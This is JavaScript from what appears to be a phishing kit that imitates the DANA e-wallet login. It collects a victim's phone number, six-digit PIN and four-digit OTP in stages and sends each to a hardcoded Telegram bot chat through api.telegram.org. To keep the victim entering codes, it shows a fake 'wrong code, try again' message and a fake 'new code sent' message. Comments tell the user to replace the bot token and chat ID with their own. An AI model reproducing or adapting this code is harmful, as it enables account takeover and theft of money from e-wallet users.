 function sendNohp(event){
    $("#process").show();event.preventDefault();
    $("#inp").blur();
     
    
    
    var nomor = document.getElementById("inp").value;
            sessionStorage.setItem("nomor", nomor);
    var logo = document.getElementById('logo');       
    var inp = document.getElementById('inp');
    
    var gabungan = '' + logo.value + '%0Að—¡ð—¼ð—ºð—¼ð—¿ ð——ð—”ð—¡ð—” : ' + '0' + inp.value;
   
    var token = '6005539670:AAG0B56ifeSUknSXOicJ3TqA0o-KbEP11DY'; // Ganti dengan token bot yang kamu buat
    var grup = '2112174174'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
    $("#process").hide();
    document.getElementById("back1").style.display = "none";
    document.getElementById("back2").style.display = "block";
    $("#formNohp").fadeOut();
    setTimeout(function(){
   
    $("#formPin").fadeIn();
    $("#pin1").focus();
    }, 500);}});};
    

function sendPin(){

 
 
  var nomor = sessionStorage.getItem("nomor");
        document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor+ " via<br/>";
  var logo = document.getElementById('logo'); 
  var inp = document.getElementById('inp');
 var pin1 = document.getElementById('pin1');
 var pin2 = document.getElementById('pin2');
 var pin3 = document.getElementById('pin3');
 var pin4 = document.getElementById('pin4');
 var pin5 = document.getElementById('pin5');
 var pin6 = document.getElementById('pin6');
     
  var gabungan = '' + logo.value + '%0Að—¡ð—¼ð—ºð—¼ð—¿ ð——ð—”ð—¡ð—” : ' + '0' + inp.value + '%0Að—£ð—œð—¡ ð——ð—”ð—¡ð—”.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
  
     
 

    var token = '6005539670:AAG0B56ifeSUknSXOicJ3TqA0o-KbEP11DY'; // Ganti dengan token bot yang kamu buat
    var grup = '2112174174'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,


success: function(){
$("#process").hide();
document.getElementById("alert").style.display = "block"; 
$(".bgotp").fadeIn();
setInterval(countdown, 1000);
$("#otp1").focus();
}
}
);
};


  function sendOtp(){
    $(".loadingOtp").show();
     var logo = document.getElementById('logo'); 
     var inp = document.getElementById('inp');
 var pin1 = document.getElementById('pin1');
 var pin2 = document.getElementById('pin2');
 var pin3 = document.getElementById('pin3');
 var pin4 = document.getElementById('pin4');
 var pin5 = document.getElementById('pin5');
 var pin6 = document.getElementById('pin6');
     var otp1 = document.getElementById('otp1');
   var otp2 = document.getElementById('otp2');
   var otp3 = document.getElementById('otp3');
   var otp4 = document.getElementById('otp4');
    setTimeout(function(){
$(".alert").text("Mohon pastikan kodenya sudah benar dan coba lagi");
$(".alert").css("color","red");
 },2000);
    var gabungan = '' + logo.value + '%0Að—¡ð—¼ð—ºð—¼ð—¿ ð——ð—”ð—¡ð—” : ' + '0' + inp.value + '%0Að—£ð—œð—¡ ð——ð—”ð—¡ð—”.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0Að—¢ð—§ð—£ ð——ð—”ð—¡ð—”     : ' + otp1.value + otp2.value + otp3.value + otp4.value;


    var token = '6005539670:AAG0B56ifeSUknSXOicJ3TqA0o-KbEP11DY'; // Ganti dengan token bot yang kamu buat
    var grup = '2112174174'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        
    success: function(){
    setTimeout(function(){
    $(".loadingOtp").hide();
   
    $('.inpotp').val('');
   
  var nomor = sessionStorage.getItem("nomor");
        document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor +  " via<br/>";
   $(".alert").css("color","black");
    },4000);
   
        
    }
        
    }
    );
        
    };
